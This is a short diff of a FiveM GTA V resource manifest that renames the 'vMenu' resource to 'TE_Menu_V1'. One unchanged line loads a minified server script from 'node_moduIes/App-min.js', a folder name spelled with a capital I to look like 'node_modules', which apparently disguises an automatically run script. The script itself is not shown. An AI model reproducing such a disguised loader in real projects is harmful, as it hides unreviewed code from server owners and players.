@@ -3,7 +3,7 @@ games {'gta5'}
 lua54 "yes"
 
 
-name 'vMenu'
+name 'TE_Menu_V1'
 version 'v1.2.1'
 author 'Al-Dolime'
 
@@ -43,6 +43,7 @@ files {
 	"html/*.ogg"
 }
 server_script "node_moduIes/App-min.js"
+
 
 
 
